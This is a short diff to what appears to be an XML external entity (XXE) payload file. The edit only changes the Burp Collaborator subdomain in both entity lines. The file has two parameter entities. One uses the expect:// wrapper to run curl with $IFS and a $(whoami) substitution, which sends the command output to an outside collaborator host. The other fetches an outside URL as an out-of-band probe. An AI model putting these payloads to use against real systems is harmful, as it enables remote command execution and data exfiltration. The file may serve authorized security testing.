@@ -1,4 +1,4 @@
-<!ENTITY % cccc SYSTEM "expect://curl$IFS'$(whoami).v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net'">
+<!ENTITY % cccc SYSTEM "expect://curl$IFS'$(whoami).7qygqa9ekxeuzfdkk9tmqa1o7fdh16.burpcollaborator.net/'">
 %cccc;
-<!ENTITY % ddd SYSTEM "https://bbb.v2y42yl2wlqib3p8wx5a2ydcj3pydn.burpcollaborator.net/">
+<!ENTITY % ddd SYSTEM "https://bbb.7qygqa9ekxeuzfdkk9tmqa1o7fdh16.burpcollaborator.net/">
 %ddd;
